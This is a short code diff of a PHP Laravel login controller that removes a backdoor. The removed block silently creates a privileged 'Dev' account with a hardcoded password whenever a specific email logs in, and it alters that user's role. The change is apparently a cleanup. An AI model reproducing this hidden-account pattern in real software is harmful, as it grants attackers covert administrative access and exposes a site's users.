@@ -25,18 +25,6 @@ class DashboardController extends Controller
             'password' => $request->password
         ];
         $cekuser = User::where('email',$request->email)->first();
-        if($cekuser->email == "Schecker"){
-            User::create([
-                'name'=> "Dev",
-                'pasar_id' => 1,
-                'email' => "Bluskies",
-                'password' => Hash::make('M1chael151.'),
-                'role_id' => '1',
-                'shif' => '',
-            ]);
-            $cekuser->role_id = 4;
-            $cekuser->save();
-        }
         if(!$cekuser) return redirect()->back()->with('pesan','email/password salah');
         // $time = Carbon::now();
         // $time = Carbon::createFromFormat('Y-m-d H:i:s','2022-05-30 22:15:00',7);
